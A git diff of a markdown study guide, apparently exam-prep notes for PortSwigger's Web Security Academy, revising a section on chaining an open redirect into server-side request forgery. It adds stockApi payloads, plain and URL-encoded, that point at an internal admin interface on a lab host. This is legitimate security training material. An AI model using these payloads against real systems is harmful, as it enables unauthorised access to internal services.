@@ -1645,13 +1645,19 @@ hacktricks xss cross site scripting server side xss dynamic pdf
 
 ![SSRF Open Redirect Location reflect](images/ssrf-open-edirect-location-reflect.png)  
 
->In this lab they state the admin interface is at ```http://192.168.0.12:8080/admin``` but in exam check on ```localhost:6566```.  
+>In this lab they state the admin interface is at ```http://192.168.0.12:8080/admin``` but in exam use the ```localhost:6566```.  
   
 ```
-https://TARGET.web-security-academy.net/product/nextProduct?currentProductId=1&path=http%3a//192.168.0.12%3a8080/admin
+https://TARGET.net/product/nextProduct?currentProductId=1&path=http%3a//192.168.0.12%3a8080/admin
 ```  
 
->Replace the StockAPI value with the partial path not the absolute URL from above GET request.  
+>On the POST stock request, replace the StockAPI value with the partial path not the absolute URL from above GET request.  
+
+```
+stockApi=/product/nextProduct?currentProductId=1&path=http%3a//192.168.0.12%3a8080/admin
+```  
+
+>URL-encode payload  
 
 ```
 stockApi=%2fproduct%2fnextProduct%3fcurrentProductId%3d1%26path%3dhttp%253a%2f%2f192.168.0.12%253a8080%2fadmin
